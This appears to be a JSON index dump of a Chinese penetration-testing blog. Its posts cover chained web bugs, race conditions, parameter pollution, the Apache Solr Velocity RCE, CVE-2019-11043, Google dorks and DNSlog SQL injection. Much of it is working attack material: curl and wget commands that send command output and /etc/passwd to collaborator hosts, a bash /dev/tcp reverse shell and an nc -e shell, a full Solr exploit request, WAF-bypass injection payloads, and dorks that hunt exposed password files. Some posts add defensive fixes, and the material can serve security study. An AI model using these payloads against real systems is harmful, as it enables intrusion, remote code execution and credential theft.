0x05 防御方法 若非必需则不开启CORS； 若业务必需开启CORS，需严格限制外域白名单，禁止使用通配符*，同时尽量避免使用Access-Control-Allow-Credentials头字段；","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://www.vkxss.top/categories/前端安全/"}],"tags":[{"name":"前端知识","slug":"前端知识","permalink":"http://www.vkxss.top/tags/前端知识/"}]},{"title":"漏洞挖掘的组合拳","slug":"渗透测试-漏洞挖掘的组合拳","date":"2019-11-15T07:30:08.000Z","updated":"2020-01-09T09:25:59.973Z","comments":true,"path":"2019/11/15/渗透测试-漏洞挖掘的组合拳/","link":"","permalink":"http://www.vkxss.top/2019/11/15/渗透测试-漏洞挖掘的组合拳/","excerpt":"","text":"漏洞挖掘的组合拳案例一 URL跳转+CSRF漏洞 条件：校验referer值、存在URL跳转漏洞、存在CSRF漏洞 当网站校验Referer值，无CSRG_token,的时候。我们配合URL跳转完成攻击。来提升漏洞危害性 案例二 SELF-XSS+CSRF漏洞 条件：存在CSRF漏洞 可以利用csrf写入型篡改他人信息。例如利用csrf做个钓鱼界面，来修改他人的信息，比如修改备注名、邮箱、手机号。有的业务需要二次验证。当我们修改用户手机号或邮箱后。导致用户无法登陆。来提升漏洞危害性。 案例三 SELF-XSS+越权漏洞 条件：通过篡改ID，可以越权。 当我们的xss只能自己触发的时候，他会有点鸡肋，所以配合越权获取其他人的cookie。我们越权修改他人信息后，触发代码。我们收到的cookie信息就是其他人的啦。来提升漏洞危害性。 案例四 URL跳转+DOMXSS 我们在测试的时候总会遇到类似returnurl这样的参数，后边的值是跳转的地址，当开发没有做白名单的时候，我们就实现任意URL跳转，或者有的触发条件是需要用户登陆后进行跳转的。但我们有时候会疏忽另一个测试点，就是DOM型XSS：“JavaScript：alert（/xss/）//”。开发同样没有对用户输入的字符进行过滤。 案例五 文件上传+条件竞争=RCE 现在大部分厂商都喜欢把业务中上传的图片，存储在云上。有遮样一个案例，当把上传的图片先传到服务器，服务器再传到云上，这样就可以利用条件竞争进行RCE攻击。 案例六 目录遍历+文件上传=RCE 案例七 文件上传+文件名XSS https://cloud.tencent.com/developer/article/1165636 案例八 文件上传+文件内容XSS https://xz.aliyun.com/t/6362 案例九 文件上传+文件名注入 http://kfbiji.com/article/d7e00b56df31a053 案例十 文件上传+文件内容注入 https://paper.seebug.org/256/#sql-ii 案例十一 Self-XSS+CSRF=Reflected-XSS -例如在评论、登录、文件上传等处的Self-XSS，结合CSRF可变为反射型XSS。 未完结。。。。。。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Python多线程测试并发漏洞测试","slug":"Python-多线程测试并发漏洞测试","date":"2019-11-13T07:30:08.000Z","updated":"2019-11-15T09:10:27.215Z","comments":true,"path":"2019/11/13/Python-多线程测试并发漏洞测试/","link":"","permalink":"http://www.vkxss.top/2019/11/13/Python-多线程测试并发漏洞测试/","excerpt":"","text":"Python多线程测试并发漏洞测试 步骤记录 Python多线程测试并发漏洞测试 我们在使用黑盒，例如测试一些支付、兑换类的功能时，都需要进行多线程并发测试，来确保测试的应用在代码或者数据库层是否加锁。 步骤记录 Burp Suite安装插件，方便生成python发包代码 拦截包并生成代码,并打开一个文本编辑器，右键粘贴出来： 运行Python多线程代码 将生成的python代码粘贴到action()函数里面即可； 12345678910111213141516171819202122import threadingimport requeststhreads = []def action(): burp0_url = &quot;https://www.baidu.com:443/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=1&quot; burp0_cookies = &#123;&quot;BAIDUID&quot;: &quot;E316F3DB8A100CF49C7840194D685130:FG=1&quot;, &quot;BIDUPSID&quot;: &quot;E316F3DB8A100CF4365A4179630696D4&quot;, &quot;PSTM&quot;: &quot;1571902876&quot;, &quot;BD_UPN&quot;: &quot;133252&quot;, &quot;H_PS_PSSID&quot;: &quot;1434_21105_29568_29220_22160&quot;, &quot;BDORZ&quot;: &quot;B490B5EBF6F3CD402E515D22BCDA1598&quot;, &quot;delPer&quot;: &quot;0&quot;, &quot;BD_CK_SAM&quot;: &quot;1&quot;, &quot;PSINO&quot;: &quot;2&quot;, &quot;BD_HOME&quot;: &quot;0&quot;, &quot;H_PS_645EC&quot;: &quot;6d50bLk7EAzhqdJENzPoKrR6B%2FRN9gavPDwdfFeqclmRNgzaMlT7KBxZaRg&quot;, &quot;COOKIE_SESSION&quot;: &quot;292444_5_6_2_4_26_0_2_2_5_0_0_243247_0_0_0_1573179527_1572936381_1573657905%7C6%23221_3_1572936369%7C2&quot;, &quot;BDSVRTM&quot;: &quot;130&quot;&#125; burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125; res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies) # print(res.status_code)if __name__ == &apos;__main__&apos;: print(&quot;threading start!&quot;) for i in range(50): t = threading.Thread(target=action) t.start() print(&quot;threading end!&quot;) 确认结果即可","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"条件竞争漏洞总结","slug":"渗透测试-条件竞争漏洞总结","date":"2019-11-12T07:30:08.000Z","updated":"2019-11-13T15:35:02.401Z","comments":true,"path":"2019/11/12/渗透测试-条件竞争漏洞总结/","link":"","permalink":"http://www.vkxss.top/2019/11/12/渗透测试-条件竞争漏洞总结/","excerpt":"","text":"0x00 条件竞争漏洞介绍 0x01 漏洞挖掘 0x02 测试流程 0x03 漏洞案例 0x04 测试技巧 使用Burp模块-Inturder 修复建议 漏洞防御 0x00 条件竞争漏洞介绍 竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。 0x01 漏洞挖掘 一般挖掘的点： 签到 支付 积分兑换 转账 优惠券 提现 文件上传 绕过数量限制 等。。 0x02 测试流程 基本方法就是，例如在提交订单的时候，抓取包，然后构造脚本，进行多线程并发操作。 0x03 漏洞案例 利用竞争条件实现RCE https://www.freebuf.com/column/215340.html 利用竞争条件实现提权 https://www.jianshu.com/p/7a50d424adb1 0x04 测试技巧使用Burp模块-Inturder选择Payload类型为空，将线程调到50进行多线程异步发包 修复建议 解决方案通常是加“锁”，mysql执行事务前加BEGIN，后加COMMIT，从而锁定一次事务处理，使按序进行： 漏洞防御 对于业务端条件竞争的防范，一般的方法是设置锁； 对于文件上传，一定要经过充分完整的检查之后再上传； 在操作系统的角度，共享数据要进行上锁保护。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"参数污染漏洞（HPP）挖掘技巧","slug":"渗透测试-参数污染漏洞（HPP）挖掘技巧","date":"2019-11-09T07:30:08.000Z","updated":"2019-11-10T14:44:59.594Z","comments":true,"path":"2019/11/09/渗透测试-参数污染漏洞（HPP）挖掘技巧/","link":"","permalink":"http://www.vkxss.top/2019/11/09/渗透测试-参数污染漏洞（HPP）挖掘技巧/","excerpt":"","text":"参数污染漏洞（HPP）挖掘技巧记录 概念： 漏洞原理： 实战案例总结： 挖掘技巧： 修复方案： 参数污染漏洞（HPP）挖掘技巧记录概念：HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。 漏洞原理： 通过简单的案例可以说明这种处理的差异： 在不同的搜索引擎中进行搜索，在地址栏输入URL：/s?wd=test&amp;wd=test1，这里重复相同搜索参数，观察搜索结果的不同： (1)百度接受第一个参数（test）而放弃第二个参数（test1）： (2)Yahho接受第二个参数（test1）而放弃第一个参数（test）： (3)Google会将两个值都接受，并通过一个空格将两个参数连接起来，组成一个参数： 测试不同服务器对漏洞的处理方法： 对于Flask服务器，取第一个值 对于PHP/Apache服务器，取最后一个值我们以弹窗为例，首先将js代码放在first参数name位置，返回string(3) “222” ，证明取的是最后一个name参数的值。 具体服务端对应的不同处理方式如下 实战案例总结： HPP漏洞的产生原因一方面来自服务器处理机制的不同，另一方面来自开发人员后端检测逻辑的问题。HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。总体上HPP一般有两种利用场景： 1）逻辑漏洞，通常会造成IDOR，信息泄露，越权等漏洞; 2）作为其他漏洞的辅助，用于绕过漏洞的检测和Waf等。 这里汇总了工作中和国内外遇到的一些典型案例： 1、 逻辑漏洞（IDOR） 1）敏感操作 SilverlightFox中，网站通过URL：https://www.example.com/transferMoney.php?amount=1000&amp;fromAccount=12345进行转账操作，原本链接中是没有toAmount参数的，这个参数是后端固定的，但如果我们重复提交这个参数：toAccount=9876&amp;amount=1000&amp;fromAccount=12345&amp;toAccount=99999第二个 toAccount 参数，会覆盖后端请求，并将钱转账给恶意账户（ 99999 ）而不是由系统设置的预期账户（ 9876 ）。 (2）IDOR（不安全的对象引用） 一般的社交软件都有“关注”或”喜欢”功能，下面就是ID为5318415对5333003进行关注发送的数据包： 按我们通常挖掘逻辑漏洞的思路，我们可以篡改ID值，使对方关注我。这里5318415是我的ID，但将我的actorId替换为对方的ID，会收到“401 Unauthorized”错误，说明此处做了鉴权操作。 但是，如果请求2个actorId参数，第一个actorId参数是目标的actorId。这样5024700（受害者）会关注5318415（我）。这次得到的响应是202 Accepted。 后台对于actorId的鉴权操作是对第二个，关注操作取的却是第一个。所以在测试越权类问题时未果不妨多试一步HPP，下面Twitter案例也是如出一辙：https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26 通过添加第二个uid，取消Twitter的邮箱提醒。 3）社交分享链接 不少网站都有社交分享按钮，可以把内容分享到其他社交媒体，如Hackerone的链接为：https://hackerone.com/blog/introducing-signal，分享到FB上链接为： https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal 如果我们将要分享的Hackerone的链接改为：https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov，则最终的跳转会成为： https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov 后一个参数u拥有比第一个更高的优先级，之后会用于 Fackbook 的发布，最终会跳转到恶意站点https://vk.com/durov。 4）页面跳转 一个Digits跳转的案例，跳转链接如下： https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv 如果直接修改参数为http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP： https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com 从而第一个host参数绕过验证，取第二个host参数作为跳转源。 5）权限操作 以下代码： &lt;? $val=htmlspecialchars($_GET[&#39;par&#39;],ENT_QUOTES); ?&gt; 1234567- 以下代码使用par参数取用户输入并生成URL：- http://host/page.php?action=view&amp;par=123- 但用户若输入par为则最终生成的链接为：123&amp;amp;action=edit，则最终的请求则变成：- http://host/page.php?action=view&amp;par=123&amp;amp;action=edit- 通过重复提交action参数，会导致应用接受编辑操作而不是查看操作，实现权限的提升。- 注：&apos;&amp;amp;&apos; = &apos;&amp;&apos; ，在HTML中的&amp;用&amp;amp; 来表示 2、 绕过检测（WAF） 1）SQL绕过1 12345- 一个常见的SQL注入payload如:- http://xxx/horse.php?id=7 union select 1,2,3，current_user- 探测发现网站配置了WAF来阻止任意包含“select”或“union”等常用的SQL查询关键字，通过HPP绕过：- http://xxx/horse.php?id=0&amp;amp;id=7%20union%20select%201,2,3,current_user- 注入语句被写到第二个参数值的位置，不会被waf解析。 2）SQL绕过2 ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单。但是这个web服务器在遇到为同一个参数赋值不同数值时，会采取类似谷歌的处理方式，将参数连接起来，以此来绕过黑名单。例如提交如下的URL： http://xxx/index.aspx?page=select 1&amp;page=2,3 from table 3）Apple Cups的XSS Apple Cups是被许多UNIX系统利用的打印系统。系统对kerberos进行了黑名单过滤，通过前置一个重复参数可以触发xss： http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos= 这个方法可以绕过系统的验证机制，原因是这个验证系统只采纳了第二个kerberos的值，这个值为空，因此不会触发。而第一个kerberos直到被用于构建动态HTML内容前都没有被验证。最终在web站点的上下文中javascript语句被执行。 4）URL重定向+HPP+XSS 在点击网站的链接时，会将用户重定向到一个页面，链接为： xxx.aspx?dest=http://whitelistedWebsite.com 这容易想到URL重定向漏洞，经过探测，发现dest参数接受的协议有http:// ftp:// http:/ javascript:/，所以尝试构造xss： dest=javascript://alert(document.domain) 发现存在白名单限制，尝试绕过： dest=javascript:/whitelistedWebsite.com/i;alert(document.domain 但分号；会无法解析，导致报错，最终使用HPP绕过： dest=javascript:/whitelistedWebsite.com/i&amp;dest=alert(1) 原理和例1类似，接受两个参数值进行拼接：javascript://alert(1) 挖掘技巧： 根据上面的实战案例总结，在挖掘HPP漏洞的时候，需要注意以下几点： 1、和IDOR漏洞挖掘类似，关注与用户权限紧密相关的参数，有些场景可能防范了IDOR，但重复提交参数可能就会产生奇效； 2、在挖掘其他漏洞的时候，如果进行了检测又无法绕过的情况下，可以尝试通过重复提交参数/参数拼接方式绕过检测。 修复方案： 概括地讲，防范这类攻击的方法有两种： 1、设备层面，让WAF或其他网关设备（比如IPS）在检查URL时，对同一个参数被多次赋值的情况进行特殊处理。由于HTTP协议允许相同参数在URL中多次出现，因此这种特殊处理需要注意避免误杀的情况； 2、代码层面，编写WEB程序时，要通过合理的$_GET方法获取URL中的参数值，而尝试获取web服务器返回给程序的其他值时要慎重处理，结合其他漏洞的产生进行组合排查。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"无回显代码执行利用方法总结","slug":"渗透测试-无回显代码执行利用方法总结","date":"2019-11-08T07:30:08.000Z","updated":"2020-03-23T08:57:46.592Z","comments":true,"path":"2019/11/08/渗透测试-无回显代码执行利用方法总结/","link":"","permalink":"http://www.vkxss.top/2019/11/08/渗透测试-无回显代码执行利用方法总结/","excerpt":"","text":"0X00 DNSLOG回显 0X01 curl上传文件 0X02 Wget 0X03 反弹shell 0X04 无空格命令执行 0X00 DNSLOG回显 尝试DNSLOG获取回显使用反引号执行代码，并用curl将执行结果返回给DNSLOG 12curl http://dnslog/`whoami`ping `whoami`.dnslog 0X01 curl上传文件 我们可以用 -X POST 来申明我们的请求方法，用 -F “file=@FILE_PATH“ 的请示，传输文件即可。 12345# 利用Burp：curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://a8jmrauzh2kxy56bhk99xwhh78dy1n.burpcollaborator.net -v# 利用NC：curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://127.0.0.1:9999 -v 打开Burp主界面 –&gt;菜单（Burp）–&gt;Burp Collaboraor Client – &gt; 点击 Copy to Clipboard 0X02 Wget wget指定header头查看日志回显 1wget -d --header=&quot;User-Agent: $(cat /etc/passwd|tail -n 1)&quot; http://127.0.0.1/1.php 0X03 反弹shell 用nc返回一个交互式的shell 12345678# 服务器端执行nc -vv -lp 8888# 命令执行处执行bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1# payloadcommand=111%0d%0abash+-i+&gt;%26+/dev/tcp/127.0.0.1/8888+0&gt;%261 0X04 无空格命令执行 在一些漏洞利用场景，或者因为waf等原因，导致无法使用空格时，可以试试如下命令： 123456IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd` cat$IFS/etc/passwd cat$&#123;IFS&#125;/etc/passwd cat&lt;/etc/passwd &#123;cat,/etc/passwd&#125; X=$&apos;cat\\x20/etc/passwd&apos;&amp;&amp;$X 经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Apache_Solr_Velocity模板注入RCE漏洞","slug":"渗透测试-Apache_Solr_Velocity模板注入RCE漏洞","date":"2019-10-31T07:30:08.000Z","updated":"2019-11-01T03:31:26.517Z","comments":true,"path":"2019/10/31/渗透测试-Apache_Solr_Velocity模板注入RCE漏洞/","link":"","permalink":"http://www.vkxss.top/2019/10/31/渗透测试-Apache_Solr_Velocity模板注入RCE漏洞/","excerpt":"","text":"0x00 前言 0x01 漏洞详情 0x02 POC 0x03 复现 0x00 前言 Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。 r是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。 0x01 漏洞详情 该漏洞的产生原因： 1、攻击者可以直接访问solr admin页面,并可以通过构造post请求来修改节点的配置. 2.Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。 3、当params.resource.loader.enabled设置为true，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个恶意的请求，在服务器上进行命令执行,从而获取服务器的权限。 0x02 POC123456789101112131415161718192021222324252627282930313233343536373839404142来自：https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt Apache Solr RCE via Velocity templateSet &quot;params.resource.loader.enabled&quot; as true.Request:========================================================================POST /solr/test/config HTTP/1.1Host: solr:8983Content-Type: application/jsonContent-Length: 259&#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125;========================================================================RCE via velocity templateRequest:========================================================================GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1Host: localhost:8983========================================================================Response:========================================================================HTTP/1.1 200 OKContent-Type: text/html;charset=utf-8Content-Length: 56 0 uid=8983(solr) gid=8983(solr) groups=8983(solr)========================================================================0x03 复现 环境搭建 1234下载最新的Solr下载地址:https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip解压以后,进入solr-8.2.0/bin目录使用./solr -e dih -force开启示例app payload: 12/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end注意：漏洞需要Content-Type为application/json 反弹shell： 可以反弹shell，使用nc命令： nc -e /bin/bash ip port成功反弹shell","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"CVE-2019-11043-PHP远程代码执行漏洞复现","slug":"CVE-2019-11043","date":"2019-10-25T07:30:08.000Z","updated":"2019-11-01T05:22:25.327Z","comments":true,"path":"2019/10/25/CVE-2019-11043/","link":"","permalink":"http://www.vkxss.top/2019/10/25/CVE-2019-11043/","excerpt":"","text":"0X00 简介 0X01 CVE编号 0X02 漏洞威胁等级 0X03 影响范围 0X04 漏洞复现 0X05 漏洞总结 0X06 Reference 0X00 简介 9 月 26 日，安全研究员 Andrew Danau向PHP 提交一枚远程代码执行漏洞，使用某些特定配置的Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。该漏洞EXP于10月22日公开。原因是：Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。 0X01 CVE编号 CVE-2019-11043 0X02 漏洞威胁等级 高危 0X03 影响范围 Nginx+ php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。 1234567location ~ [^/]\\.php(/|$) &#123; fastcgi_split_path_info^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... &#125;&#125; 0X04 漏洞复现 在EXP公布的时候，vulhub也发布了相应的镜像，本次实验使用该镜像进行复现。 https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043 将文件下载下来之后，搭建环境: docker-compose up -d Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。 详情参考Reference 0X05 漏洞总结 利用条件苛刻，因为触发漏洞的配置不是默认配置。 即使是触发漏洞的配置，仍有失败的机率，执行命令时成功率50%的样子。 0X06 Reference 参考链接：https://github.com/vkbiu/CVE/tree/master/CVE-2019-11043","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16759","slug":"CVE-2019-16759","permalink":"http://www.vkxss.top/tags/CVE-2019-16759/"}]},{"title":"google_hack语法","slug":"渗透测试-google_hack语法","date":"2019-10-24T04:25:40.000Z","updated":"2019-12-12T07:58:26.878Z","comments":true,"path":"2019/10/24/渗透测试-google_hack语法/","link":"","permalink":"http://www.vkxss.top/2019/10/24/渗透测试-google_hack语法/","excerpt":"","text":"google hack语法 简介在日站的时候google搜索能让我们获得意想不到的信息，可以找到目标站点的敏感信息。后台等等 google hack语法列表初级语法表 123456789模糊搜索-例如：卢本伟精确搜索-例如：\"卢本伟\"通配符*-例如：何安圻*通配符.-例如：大岭山中学. PS:.的通配符用于匹配字符布尔逻辑-例如：大岭山中学 and 何安圻逻辑或|-例如：绿盟 (郑州)逻辑非-例如：何安圻 -博客园约束条件-例如：黎颖希 +获奖数字范围-例如：绿盟+2009年 2015年 高级语法表 12345678910访问基本信息-例如：info:baidu.com标题搜索-例如：intitle:后台登录正文搜索-例如：intext:身份证大全url搜索-例如：inurl:google.com锚链链接搜索-例如：inanchor:google文档类型限定搜索-例如：intext:身份证大全 filetype:xls缓存搜索-l例如：cache:secqun.org相关网址搜索-例如：related:google hacking相关连接搜索-例如：link:baidu.com与指定域名相关的搜索：site:baidu.com 高级利用 123456inurl:robots.txtintitle:登录 intext:username inurl:login.jspinurl:8080 inurl:jspfiletype:sql site:com and \"insert into admin 2014\"inurl:jsp/demo.jspinurl:update set inurl:where 渗透利用： 1234567891011121314151617181920212223242526272829“Login: ” “password =” filetype: xls ( 搜索存储在excel文件中含有password的数据)。allinurl: auth_user_file.txt (搜索包含在服务器上的 auth_user_file.txt 的文件）。filetype: xls inurl: “password.xls” (查找 用户名和密码以excel格式）这个命令可以变为“admin.xls”.intitle: login password (获取登陆页面的连接，登陆关键词在标题中。)intitle: “Index of” master.passwd (密码页面索引)index of / backup ( 搜索服务器上的备份文件）intitle: index.of people.lst (包含people.list的网页）intitle: index.of passwd.bak ( 密码备份文件)intitle: “Index of” pwd.db (搜索数据库密码文件).intitle: “Index of .. etc” passwd (安装密码建立页面索引）.index.of passlist.txt (以纯文本的形式加载包含passlist.txt的页面).index.of.secret (显示包含机密的文档，.gov类型的网站除外) 还可以使用: index.of.privatefiletype: xls username password email (查找表格中含有username和password的列的xls文件).”# PhpMyAdmin MySQL-Dump” filetype: txt (列出包含敏感数据的基于php的页面)inurl: ipsec.secrets-history-bugs (包含只有超级用户才有的敏感数据). 还有一种旧的用法 inurl: ipsec.secrets “holds shared secrets”inurl: ipsec.conf-intitle: manpageinurl: “wvdial.conf” intext: “password” (显示包含电话号码，用户名和密码的连接。）inurl: “user.xls” intext: “password” (显示用户名和密码存储在xls的链接。)filetype: ldb admin (web服务器查找存储在数据库中没有呗googledork删去的密码。）inurl: search / admin.php (查找admin登陆的php页面). 如果幸运的话，还可以找到一个管理员配置界面创建一个新用户。inurl: password.log filetype:log (查找特定链接的日志文件。)filetype: reg HKEY_CURRENT_USER username (在HCU (Hkey_Current_User)路径中查找注册表文件(registyry)。)“Http://username: password @ www …” filetype: bak inurl: “htaccess | passwd | shadow | ht users”(查找备份文件中的用户名和密码。)filetype:ini ws_ftp pwd (通过ws_ftp.ini 文件查找admin用户的密码)intitle: “Index of” pwd.db (查找加密的用户名和密码）inurl:admin inurl:backup intitle:index.of (查找关键词包含admin和backup的目录。)“Index of/” “Parent Directory” “WS _ FTP.ini” filetype:ini WS _ FTP PWD (WS_FTP 配置文件， 可以获取FTP服务器的进入权限)ext:pwd inurl:(service|authors|administrators|users) “# -FrontPage-”filetype: sql ( “passwd values *” |” password values *” | “pass values **“) 查找存储在数据库中的sql代码和密码。 )","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"Mysql-Dnslog盲注","slug":"渗透测试-Mysql-Dnslog盲注","date":"2019-10-21T06:25:40.000Z","updated":"2020-03-04T03:17:05.566Z","comments":true,"path":"2019/10/21/渗透测试-Mysql-Dnslog盲注/","link":"","permalink":"http://www.vkxss.top/2019/10/21/渗透测试-Mysql-Dnslog盲注/","excerpt":"","text":"0x00 为什么用Dnslog盲注 0x01 利用条件 0x02 如何查看mysql是否开启了文件导入导出？ 0x03 构造攻击Payload 0X04 Reference 0x00 为什么用Dnslog盲注 对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。 0x01 利用条件 数据库的load_file函数必须可用，也就是数据库用户必须要有file_priv权限 其次就是mysql的secure_file_priv不为NULL,有些高版本的mysql中的secure_file_priv默认为NULL secure_file_priv特性secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。 0x02 如何查看mysql是否开启了文件导入导出？ 在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，NULL值会禁用这些函数。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。 使用如下命令查看： mysql&gt;show global variables like ‘%secure%’; secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。 总结下如何修改secure_file_priv的值？ windows下：修改my.ini 在[mysqld]内加入secure_file_priv = linux下：修改my.cnf 在[mysqld]内加入secure_file_priv = MYSQL新特性secure_file_priv对读写文件的影响 然后重启mysql，再查询secure_file_priv 0x03 构造攻击Payload 普通payload： 123456select load_file(concat(&apos;\\\\\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\\\abc&apos;))concat是字符串拼接；用4个,因为\\\\会被转义为:\\database()就是你要做SQL注入查询的地方&apos;.xxxx.ceye.io\\abc&apos;就是你的dnslog平台给你的域名unc路径 网络共享文件方式 \\\\dnslog\\abc这样的路径 - 上面拼接的结果就是&quot;\\\\\\\\ schema_name.dnslog\\\\abc&quot;，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了。 加密payload 利用bur or select hex(“要加密的数据”)即可. 1234加密前： select load_file(concat(&quot;\\\\\\\\&quot;,version(),&quot;.dnslog\\\\abc&quot;));16进制加密后： select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263)); 读配置文件payload 